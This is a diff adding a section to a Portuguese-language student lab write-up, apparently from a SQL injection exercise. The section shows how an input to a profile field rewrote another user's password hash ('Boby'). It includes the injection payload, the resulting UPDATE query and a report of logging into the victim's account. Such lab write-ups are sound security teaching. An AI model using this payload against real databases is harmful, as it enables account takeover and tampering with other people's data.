@@ -132,3 +132,26 @@ PhoneNumber='933667378',Salary='-9999999' WHERE Name='Boby'# WHERE ID=$id;
 Aqui podemos ver o valor do salário do Boby antes e depois do ataque:
 
 ![Task 3 b](../img/lab8task3b.png)
+
+#### Task 3.3 - Modify other people’ password
+
+Para alterar a password de outro utilizador usamos uma técnica parecida com a anterior. Desta vez o valor a modificar foi cifrado antes com criptografia SHA1. Por exemplo, para a nova palavra-passe `penguin`, o hash é `73335c221018b95c013ff3f074bd9e8550e8d48e`.
+
+```sql
+912345678', password='73335c221018b95c013ff3f074bd9e8550e8d48e' WHERE name='Boby'#
+```
+
+Com este input, o servidor executou o seguinte código:
+
+```sql
+UPDATE credential SET
+nickname='$input_nickname',
+email='$input_email',
+address='$input_address',
+Password='$hashed_pwd',
+PhoneNumber='933667378', password='73335c221018b95c013ff3f074bd9e8550e8d48e' WHERE name='Boby'# WHERE ID=$id;
+```
+
+Com a nova palavra passe alterada, conseguimos entrar na conta do Boby:
+
+![Task 3 c](../img/lab8task3c.png)
